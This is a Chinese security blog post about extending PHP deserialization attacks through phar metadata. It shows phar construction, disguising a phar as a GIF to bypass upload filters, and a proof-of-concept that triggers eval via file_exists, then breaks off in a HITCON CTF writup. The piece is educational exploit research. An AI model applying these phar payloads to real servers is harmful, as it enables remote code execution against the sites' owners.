<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="phar扩展php反序列化的攻击面"><meta name="keywords" content="php,反序列化"><meta name="author" content="V0WKeep3r,v0wldl@163.com"><meta name="copyright" content="V0WKeep3r"><title>phar扩展php反序列化的攻击面 | V0W's Blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.8.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.8.2"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="V0W's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-text">phar文件结构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-stub"><span class="toc-text">a stub</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#a-manifest-describing-the-contents%EF%BC%88%E4%B8%80%E4%B8%AA%E6%8F%8F%E8%BF%B0%E5%86%85%E5%AE%B9%E7%9A%84%E6%B8%85%E5%8D%95%EF%BC%89"><span class="toc-text">a manifest describing the contents（一个描述内容的清单）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#the-file-contents"><span class="toc-text">the file contents</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E9%80%89-%E9%AA%8C%E8%AF%81phar%E5%AE%8C%E6%95%B4%E6%80%A7%E7%9A%84%E7%AD%BE%E5%90%8D"><span class="toc-text">[可选] 验证phar完整性的签名</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AAphar%E6%96%87%E4%BB%B6"><span class="toc-text">构造一个phar文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6"><span class="toc-text">phar文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%86phar%E5%9C%A8%E4%BC%AA%E9%80%A0%E6%88%90%E5%85%B6%E4%BB%96%E6%96%87%E4%BB%B6"><span class="toc-text">将phar在伪造成其他文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-text">实际利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E4%BB%8E%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90%E5%BC%80%E5%A7%8B"><span class="toc-text">先从一个简单的例子开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%93%E5%B9%B40%E8%A7%A3%E7%9A%84HITCON2017-Baby-H-MasterPHP"><span class="toc-text">当年0解的HITCON2017 Baby^H MasterPHP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E%E6%BA%90%E7%A0%81%E8%A7%92%E5%BA%A6%E6%9D%A5%E7%9C%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">从源码角度来看phar反序列化的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-text">思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%EF%BC%88wrapper%EF%BC%89"><span class="toc-text">流封装协议（wrapper）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%95%E7%9D%80%E6%89%BE%E9%97%AE%E9%A2%98%E7%9A%84%E6%BA%90%E5%A4%B4"><span class="toc-text">试着找问题的源头</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">受影响的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exif"><span class="toc-text">exif</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gd"><span class="toc-text">gd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash"><span class="toc-text">hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-url"><span class="toc-text">file &#x2F; url</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#standard"><span class="toc-text">standard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip"><span class="toc-text">zip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bzip-Gzip"><span class="toc-text">Bzip &#x2F; Gzip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PDO-postgresql"><span class="toc-text">PDO::postgresql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libxml"><span class="toc-text">libxml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL"><span class="toc-text">MySQL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-text">防御方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%8F%8D%E6%80%9D"><span class="toc-text">总结与反思</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/Kaneki.jpg"></div><div class="author-info__name text-center">V0WKeep3r</div><div class="author-info__description text-center">Stay Hungry, Stay Foolish.</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/qingchenldl">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">58</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">31</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">11</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://zhuxianjin.github.io/">J0k3r</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://daolgts.github.io/">dlgts</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://iwenhu.cn/">mengchen</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0sec.net/">p0</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://asa9ao.xyz/">唯湖</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://www.nicefish.top/posts/">nicefish</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://flag0.com/">GetFlag</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/index.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">V0W's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">主页</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/about">关于我</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">phar扩展php反序列化的攻击面</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-12</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">4.7k</span><span class="post-meta__separator">|</span><span>阅读时长: 19 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前学校的seaii表哥在404发了一篇paper——<a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></p>
<p>分析了php反序列与phar的结合，大大拓展了反序列化的攻击面，我也重新审视这个漏洞，发现真的很有意思，并且有较大的杀伤力。之前分析过了<strong>php反序列化与POP链</strong>，本文就主要分析一下如何利用phar来扩展php反序列化的攻击面，并从源码角度来看一下为什么很多文件操作函数可以触发phar的反序列化。（另外膜拜一下seaii哥，啥时候能像seaii哥这么优秀啊。。。）</p>
<p>利用phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（<code>file_exists()</code>、<code>is_dir()</code>等）参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖unserialize()直接进行反序列化操作。</p>
<h1 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h1><p>详细的文件结构这一查看php文档——<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/phar.fileformat">What makes a phar a phar and not a tar or a zip?</a></p>
<h2 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h2><p>可以理解为一个标志，phar前面内容不限，但必须以<code>__HALT_COMPILER();</code>来结尾(<code>?&gt;</code>可以省略也可以包含)，否则phar扩展将无法识别这个文件为phar文件。</p>
<h2 id="a-manifest-describing-the-contents（一个描述内容的清单）"><a href="#a-manifest-describing-the-contents（一个描述内容的清单）" class="headerlink" title="a manifest describing the contents（一个描述内容的清单）"></a>a manifest describing the contents（一个描述内容的清单）</h2><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<table>
<thead>
<tr>
<th align="left">Size in bytes</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">4 bytes</td>
<td align="left">phar清单的长度(以字节为单位)(1 MB limit)</td>
</tr>
<tr>
<td align="left">4 bytes</td>
<td align="left">Phar中的文件数</td>
</tr>
<tr>
<td align="left">2 bytes</td>
<td align="left">Phar清单的API版本 (currently 1.0.0)</td>
</tr>
<tr>
<td align="left">4 bytes</td>
<td align="left">全局的phar位示图标志</td>
</tr>
<tr>
<td align="left">4 bytes</td>
<td align="left">phar的别名长度</td>
</tr>
<tr>
<td align="left">??</td>
<td align="left">phar的位示图长度</td>
</tr>
<tr>
<td align="left">4 bytes</td>
<td align="left">phar元数据长度（0表示无）</td>
</tr>
<tr>
<td align="left">??</td>
<td align="left">序列化的phar元数据，以**serialize()**格式存储</td>
</tr>
<tr>
<td align="left">只要24*条目字节数</td>
<td align="left">每个文件的条目</td>
</tr>
</tbody></table>
<h2 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h2><p>被压缩文件的内容</p>
<h2 id="可选-验证phar完整性的签名"><a href="#可选-验证phar完整性的签名" class="headerlink" title="[可选] 验证phar完整性的签名"></a>[可选] 验证phar完整性的签名</h2><p>签名，放在文件末尾，格式如下：</p>
<table>
<thead>
<tr>
<th align="left">Length in bytes</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">16 or 20 bytes</td>
<td align="left">实际签名，SHA1签名为20字节，MD5签名为16字节，SHA256签名为32字节，SHA512签名为64字节。</td>
</tr>
<tr>
<td align="left">4 bytes</td>
<td align="left">签名标志. <em>0x0001</em> 用于表示是 MD5 签名, <em>0x0002</em> 用来表示是 SHA1 签名, <em>0x0004</em> 用来表示是SHA256签名, <em>0x0008</em>用来表示是SHA512签名。 API版本1.1.0引入了SHA256和SHA512签名支持。</td>
</tr>
<tr>
<td align="left">4 bytes</td>
<td align="left">Magic <em>GBMB</em> 用于定义签名的存在</td>
</tr>
</tbody></table>
<h1 id="构造一个phar文件"><a href="#构造一个phar文件" class="headerlink" title="构造一个phar文件"></a>构造一个phar文件</h1><h2 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h2><p>根据文件结构，自己来构造一个phar文件，php内置了一个phar类处理的相关操作。</p>
<blockquote>
<p>注意：要将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为Off，否则无法生成phar文件。</p>
</blockquote>
<p>phar.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="comment">//__HALT_COMPILER(); 也是可以的</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/15/t6eI95JmQZ4Cw1L.png"></p>
<p>meta-data是用反序列化形式存储的。</p>
<p>有序列化数据必然会有反序列化操作，php一大部分的<a target="_blank" rel="noopener" href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
<table>
<thead>
<tr>
<th>受影响的函数列表</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>filename</td>
<td>filectime<br />(获取文件的inode更改时间)</td>
<td>file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup<br />(获取文件的组名)</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode<br />（获取文件inode）</td>
<td>filemtime<br />（获取文件的修改时间）</td>
<td>fileowner</td>
<td>fileperms<br />（获取文件权限）</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link<br />（判断文件名是否为符号链接）</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file<br />（解析配置文件）</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat<br />（获取文件相关信息）</td>
<td>readfile<br />（输入文件内容）</td>
</tr>
</tbody></table>
<p>试一下，文件操作函数，能否自动对其进行反序列化：</p>
<p><code>test.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Destruct called\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;wakeup called\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line">    <span class="comment">//file_exists($filename);</span></span><br><span class="line">    <span class="comment">//file($filename);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>于是当文件系统函数的参数可控时，我们可以在不调用<code>unserize()</code>的情况下，进行反序列化操作，许多的文件函数都可以触发，极大地拓展了攻击面。</p>
<blockquote>
<p>注意：</p>
<p>对于一个前后调用多个file函数的phar文件，只会反序列化一次。</p>
</blockquote>
<p>比如，将上述代码注释去掉，也是只有<code>file_get_contents</code>会反序列一次phar，后续的文件处理函数，都会基于之前反序列化完成的文件进行操作。(调用堆栈也可以说明这一点。)</p>
<p><img src="https://i.loli.net/2020/03/15/HSUOBbzWIuV8FMh.png"></p>
<h2 id="将phar在伪造成其他文件"><a href="#将phar在伪造成其他文件" class="headerlink" title="将phar在伪造成其他文件"></a>将phar在伪造成其他文件</h2><blockquote>
<p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
</blockquote>
<p>phar2.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>并且，即使将文件名修改掉，用test.php测试发现仍然可以识别为phar，执行wakeup和destrcut。</p>
<p><img src="https://i.loli.net/2020/03/15/TJUuKnl4k78M5Fa.png"></p>
<p><img src="https://i.loli.net/2020/03/15/ADHFwBxkd9vV4QZ.png"></p>
<p>这样可以绕过大部分的上传waf。</p>
<h1 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>结合之前所说的，利用条件有三：</p>
<ol>
<li>phar文件可以上传到服务器</li>
<li>要有魔术方法作为“跳板”</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等字符没有过滤。</li>
</ol>
<h2 id="先从一个简单的例子开始"><a href="#先从一个简单的例子开始" class="headerlink" title="先从一个简单的例子开始"></a>先从一个简单的例子开始</h2><p>这里用<a target="_blank" rel="noopener" href="https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/#i-7">Smi1e师傅</a>写的一个简单的例子：</p>
<p><code>upload_file.php</code>后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><code>upload_file.html</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;Upload&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<p>file_un.php存在<code>file_exists()</code>，并且存在<code>__destruct()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure>

<p>根据<code>file_un.php</code>写一个生成phar的php文件，在文件头加上<code>GIF89a</code>绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用<code>file_exists</code>，使用<code>phar://</code>执行代码<br>构造poc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;upload/poc.phar&#x27;</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/15/IEAJsvpCFuLO2XR.png"></p>
<p><img src="https://i.loli.net/2020/03/15/gdZwsJoITkxi7MU.png"></p>
<h2 id="当年0解的HITCON2017-Baby-H-MasterPHP"><a href="#当年0解的HITCON2017-Baby-H-MasterPHP" class="headerlink" title="当年0解的HITCON2017 Baby^H MasterPHP"></a>当年0解的HITCON2017 Baby^H MasterPHP</h2><p>用一个<code>HITCON2017</code>的一道题，当时<code>php+phar</code>第一次结合出现，而且结合匿名函数的生成机制（这一点也很难）。参赛者多数搞错了方向，所以当时是0解，<a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/baby^h-master-php-2017">原题链接</a></p>
<p>题解转载自<a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#%E4%BE%8B%E9%A2%98%E4%BA%8C">mochazz</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $FLAG    = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>); </span><br><span class="line">    $SECRET  = `/read_secret`; </span><br><span class="line">    $SANDBOX = <span class="string">&quot;/var/www/data/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);  </span><br><span class="line">    @mkdir($SANDBOX); </span><br><span class="line">    @chdir($SANDBOX); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;session-data&quot;</span>])) &#123; </span><br><span class="line">        $data = serialize(<span class="keyword">new</span> User($SANDBOX)); </span><br><span class="line">        $hmac = hash_hmac(<span class="string">&quot;sha1&quot;</span>, $data, $SECRET); </span><br><span class="line">        setcookie(<span class="string">&quot;session-data&quot;</span>, sprintf(<span class="string">&quot;%s-----%s&quot;</span>, $data, $hmac)); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">        <span class="keyword">public</span> $avatar; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">            <span 